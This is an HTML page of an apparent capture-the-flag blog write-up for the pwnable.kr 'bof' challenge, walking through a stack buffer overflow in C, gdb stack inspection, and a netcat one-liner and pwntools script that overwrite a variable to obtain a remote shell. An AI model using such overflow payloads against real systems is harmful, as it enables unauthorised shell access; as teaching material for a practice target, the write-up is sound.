@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>pwnable.kr - bof | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="pwnable.kr - bof" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?" />
+<meta property="og:description" content="Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?" />
+<link rel="canonical" href="http://localhost:4000/pwn/bof/" />
+<meta property="og:url" content="http://localhost:4000/pwn/bof/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/pwn/bof/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-06-10T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"pwnable.kr - bof","dateModified":"2019-06-10T00:00:00+02:00","url":"http://localhost:4000/pwn/bof/","datePublished":"2019-06-10T00:00:00+02:00","image":"http://localhost:4000/pwn/bof/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/bof/"},"description":"Introduction Hey guys it’s been a long time since my first pwn write-up, today I’ll write about another challenge from pwnable.kr called bof. It was a simple easy buffer overflow challenge (You can also check these), by overwriting a variable we can get a shell. I’ll also write a small exploit with pwntools that spawns a shell automatically. Challenge Description ``` Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/tagbuttons.css">
+  <link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.kr - bof</h1>
+    <p class="post-meta">
+      <h7>
+        Tags: 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Buffer Overflow/';">Buffer Overflow</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/code analysis/';">code analysis</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
+        
+        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
+        
+      </h7>
+      <br>
+      <time class="dt-published" datetime="2019-06-10T00:00:00+02:00" itemprop="datePublished">Jun 10, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="introduction">Introduction</h3>
+<h4 id="hey-guys-its-been-a-long-time-since-my-first-pwn-write-up--today-ill-write-about-another-challenge-from-pwnablekr-called-bof-it-was-a-simple-easy-buffer-overflow-challenge-you-can-also-check-these-by-overwriting-a-variable-we-can-get-a-shell-ill-also-write-a-small-exploit-with-pwntools-that-spawns-a-shell-automatically">Hey guys it’s been a long time since my <a href="https://0xrick.github.io/pwn/fd/">first pwn write-up</a>,  today I’ll write about another challenge from <a href="https://pwnable.kr">pwnable.kr</a> called bof. It was a simple easy buffer overflow challenge (You can also check <a href="/categories/#binary-exploitation">these</a>), by overwriting a variable we can get a shell. I’ll also write a small exploit with <code class="highlighter-rouge">pwntools</code> that spawns a shell automatically.</h4>
+<p><img src="/images/pwn/bof/0.png" alt="" /></p>
+<hr />
+
+<h3 id="challenge-description">Challenge Description</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+</code></pre></div></div>
+<h4 id="pretty-straightforward-we-have-the-vulnerable-binary-its-source-code-and-the-port-where-its-running">Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running.</h4>
+<p><img src="/images/pwn/bof/1.png" alt="" /></p>
+<hr />
+
+<h3 id="code-analysis">Code Analysis</h3>
+<h4 id="lets-take-a-look-at-the-code-">Let’s take a look at the code :</h4>
+<p><img src="/images/pwn/bof/2.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+</code></pre></div></div>
+<h4 id="there-are-two-functions-the-main-function-and-another-function-called-func">There are two functions, the main function and another function called <code class="highlighter-rouge">func()</code></h4>
+<h4 id="func"><code class="highlighter-rouge">func()</code>:</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+</code></pre></div></div>
+<h4 id="breakdown-">Breakdown :</h4>
+<h4 id="the-function-takes-a-variable-called-key-it-starts-by-creating-a-variable-called-overflowme-and-sets-a-buffer-of-32-chars-for-it--char-overflowme32">The function takes a variable called <code class="highlighter-rouge">key</code>, it starts by creating a variable called <code class="highlighter-rouge">overflowme</code> and sets a buffer of 32 chars for it : <code class="highlighter-rouge">char overflowme[32];</code></h4>
+<h4 id="then-it-prints-overflow-me--printfoverflow-me----and-waits-for-our-input-which-will-be-saved-in-the-variable-overflowme-getsoverflowme">Then it prints <code class="highlighter-rouge">overflow me :</code> (<code class="highlighter-rouge">printf("overflow me : ");</code>)  and waits for our input which will be saved in the variable <code class="highlighter-rouge">overflowme</code> (<code class="highlighter-rouge">gets(overflowme);</code>)</h4>
+<h4 id="after-that-theres-an-if-statement-that-checks-if-the-variable-key-is-equal-to-0xcafebabe-ifkey--0xcafebabe-if-thats-true-it-will-spawn-a-shell-systembinsh-if-key-is-equal-to-anything-else-it-will-print-nah-printfnahn">After that there’s an if statement that checks if the variable <code class="highlighter-rouge">key</code> is equal to <code class="highlighter-rouge">0xcafebabe</code> (<code class="highlighter-rouge">if(key == 0xcafebabe){</code>). If that’s true it will spawn a shell (<code class="highlighter-rouge">system("/bin/sh");</code>), if <code class="highlighter-rouge">key</code> is equal to anything else it will print <code class="highlighter-rouge">Nah..</code> (<code class="highlighter-rouge">printf("Nah..\n");</code>)</h4>
+<p><br /></p>
+<h4 id="main-"><code class="highlighter-rouge">main()</code> :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+</code></pre></div></div>
+<h4 id="basically-what-the-main-function-is-doing-is-just-calling-the-function-func-giving-key-the-value-of-0xdeadbeef">Basically what the main function is doing is just calling the function <code class="highlighter-rouge">func()</code> giving <code class="highlighter-rouge">key</code> the value of <code class="highlighter-rouge">0xdeadbeef</code></h4>
+<p><br /></p>
+<h4 id="so-we-need-to-make-key-equal-to-0xcafebabe-instead-of-0xdeadbeef-to-make-it-spawn-a-shell-we-control-overflowme-but-we-dont-control-key-if-we-can-cause-a-buffer-overflow-we-will-be-able-to-overwrite-key-and-obviously-overflowme-is-vulnerable">So we need to make <code class="highlighter-rouge">key</code> equal to <code class="highlighter-rouge">0xcafebabe</code> instead of <code class="highlighter-rouge">0xdeadbeef</code> to make it spawn a shell. We control <code class="highlighter-rouge">overflowme</code> but we don’t control <code class="highlighter-rouge">key</code>. If we can cause a buffer overflow we will be able to overwrite <code class="highlighter-rouge">key</code>, and obviously <code class="highlighter-rouge">overflowme</code> is vulnerable.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="examining-the-binary-exploitation">Examining the Binary, Exploitation</h3>
+<h4 id="i-ran-the-program-and-tested-it-a-couple-of-times-first-one-with-a-short-input-">I ran the program and tested it a couple of times. First one with a short input :</h4>
+<p><img src="/images/pwn/bof/3.png" alt="" /></p>
+<h4 id="second-one-with-a-longer-input-and-it-crashed">Second one with a longer input and it crashed:</h4>
+<p><img src="/images/pwn/bof/4.png" alt="" /></p>
+<h4 id="important-thing-to-note-here-we-dont-want-to-know-the-offset-or-where-the-program-exactly-crashes-this-is-because-we-dont-need-to-overwrite-eip-we-need-to-overwrite-a-variables-value-and-thats-located-on-the-stack-so-giving-the-program-a-pattern-and-finding-the-offset-wont-help-because-we-need-to-know-where-0xdeadbeef-is-located-on-the-stack">Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite <code class="highlighter-rouge">EIP</code>, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where <code class="highlighter-rouge">0xdeadbeef</code> is located on the stack.</h4>
+<h4 id="its-time-for-gdb-i-started-gdb-and-created-a-break-point-at-main-break-main-then-i-started-the-program-r-">It’s time for <code class="highlighter-rouge">gdb</code>. I started <code class="highlighter-rouge">gdb</code> and created a break point at <code class="highlighter-rouge">main</code> (<code class="highlighter-rouge">break main</code>) then I started the program (<code class="highlighter-rouge">r</code>) :</h4>
+<p><img src="/images/pwn/bof/5.png" alt="" /></p>
+<h4 id="it-stopped-at-the-break-point-we-need-to-disassemble-the-function-func-to-get-the-address-of-the-compare-instruction-that-compares-between-the-value-of-key-and-0xcafebabe-to-set-another-break-point-there-and-look-at-the-stack">It stopped at the break point. We need to disassemble the function <code class="highlighter-rouge">func()</code> to get the address of the compare instruction that compares between the value of <code class="highlighter-rouge">key</code> and <code class="highlighter-rouge">0xcafebabe</code> to set another break point there and look at the stack.</h4>
+<p><code class="highlighter-rouge">disas func</code>
+<img src="/images/pwn/bof/6.png" alt="" /></p>
+<h4 id="we-can-see-the-cmpl-compare-logical-instruction-at-0x0000654-lets-set-a-break-point-exactly-before-it-">We can see the <a href="https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm"><code class="highlighter-rouge">cmpl</code> (Compare Logical)</a> instruction at <code class="highlighter-rouge">0x0000654</code>, Lets set a break point exactly before it :</h4>
+<p><code class="highlighter-rouge">break *0x80000654</code>
+<img src="/images/pwn/bof/7.png" alt="" /></p>
+<h4 id="now-lets-continue-the-execution-c-and-wait-for-our-break-point">Now let’s continue the execution (<code class="highlighter-rouge">c</code>) and wait for our break point.</h4>
+<p><img src="/images/pwn/bof/8.png" alt="" /></p>
+<h4 id="i-gave-it-a-short-input-because-we-dont-need-to-crash-it-and-overwrite-stuff-on-the-stack-we-just-need-to-look-at-the-stack-during-a-normal-execution-to-locate-0xdeadbeef">I gave it a short input because we don’t need to crash it and overwrite stuff on the stack, we just need to look at the stack during a normal execution to locate <code class="highlighter-rouge">0xdeadbeef</code>.</h4>
+<h4 id="after-hitting-the-second-break-point-lets-look-at-the-stack-">After hitting the second break point let’s look at the stack :</h4>
+<p><code class="highlighter-rouge">x/50wx $esp</code>
+<img src="/images/pwn/bof/9.png" alt="" /></p>
+<h4 id="0xdeadbeef-appears-at-the-first-row-in-front-of-0xbffff2e0-and-our-input-starts-to-appear-at-the-last-row-in-front-of-0xbffff2a0-we-can-locate-the-distance-between-our-input-and-0xdeadbeef-easily-each-hex-value-represents-4-chars-0x41414141--aaaa-and-we-have-exactly-13-of-them-before-0xdeadbeef-1--4--4--4"><code class="highlighter-rouge">0xdeadbeef</code> appears at the first row in front of <code class="highlighter-rouge">0xbffff2e0</code> and our input starts to appear at the last row in front of <code class="highlighter-rouge">0xbffff2a0</code>. We can locate the distance between our input and <code class="highlighter-rouge">0xdeadbeef</code> easily, each hex value represents 4 chars (<code class="highlighter-rouge">0x41414141 == AAAA</code>) and we have exactly 13 of them before <code class="highlighter-rouge">0xdeadbeef</code> (<code class="highlighter-rouge">1 + 4 + 4 + 4</code>).</h4>
+<p><img src="/images/pwn/bof/10.png" alt="" /></p>
+<h4 id="we-need-to-give-the-program-exactly-52-chars-then-0xcafebabe-and-eventually-0xdeadbeef-will-be-overwritten">We need to give the program exactly 52 chars then <code class="highlighter-rouge">0xcafebabe</code> and eventually <code class="highlighter-rouge">0xdeadbeef</code> will be overwritten.</h4>
+<h4 id="lets-try-it-i-used-python-to-print-the-payload-in-a-file-then-i-piped-that-file-to-the-nc-connection-">Let’s try it, I used python to print the payload in a file then I piped that file to the <code class="highlighter-rouge">nc</code> connection :</h4>
+<p><code class="highlighter-rouge">python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" &gt; ./payload</code>
+<br />
+<br />
+<code class="highlighter-rouge">(cat payload &amp;&amp; cat) | nc pwnable.kr 9000</code>
+<img src="/images/pwn/bof/11.png" alt="" /></p>
+<h4 id="pwned-">Pwned !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="writing-an-exploit-with-pwntools">Writing an Exploit with pwntools</h3>
+<h4 id="one-of-the-cool-things-about-pwntools-is-the-simplicity-combined-with-the-simplicity-of-this-exploit-will-make-it-just-4-lines-of-code">One of the cool things about <code class="highlighter-rouge">pwntools</code> is the simplicity, combined with the simplicity of this exploit will make it just 4 lines of code.</h4>
+<h4 id="first-thing-we-need-to-do-is-to-import-pwntools--from-pwn-import-">First thing we need to do is to import <code class="highlighter-rouge">pwntools</code> : <code class="highlighter-rouge">from pwn import *</code></h4>
+<h4 id="we-need-to-store-our-payload-in-a-variable--payload--a--52--xbexbaxfexca">We need to store our payload in a variable : <code class="highlighter-rouge">payload = 'A' * 52 + '\xbe\xba\xfe\xca'</code></h4>
+<h4 id="then-we-need-to-initiate-the-connection-and-assign-a-variable-for-it--shell--remotepwnablekr-9000">Then we need to initiate the connection and assign a variable for it : <code class="highlighter-rouge">shell = remote('pwnable.kr' ,9000)</code></h4>
+<h4 id="after-that-we-will-send-the-payload--shellsendpayload">After that we will send the payload : <code class="highlighter-rouge">shell.send(payload)</code></h4>
+<h4 id="and-finally-we-can-interact-with-our-shell--shellinteractive">And finally we can interact with our shell : <code class="highlighter-rouge">shell.interactive()</code></h4>
+<p><img src="/images/pwn/bof/12.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">52</span> <span class="o">+</span> <span class="s">'</span><span class="se">\xbe\xba\xfe\xca</span><span class="s">'</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span><span class="mi">9000</span><span class="p">)</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p><img src="/images/pwn/bof/13.png" alt="" /></p>
+<h4 id="pwned-again-">Pwned again !</h4>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<h4 id="previous-pwn-write-up--pwnablekr---fd">Previous pwn write-up : <a href="/pwn/fd/">pwnable.kr - fd</a></h4>
+<p><br /></p>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/pwn/bof/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
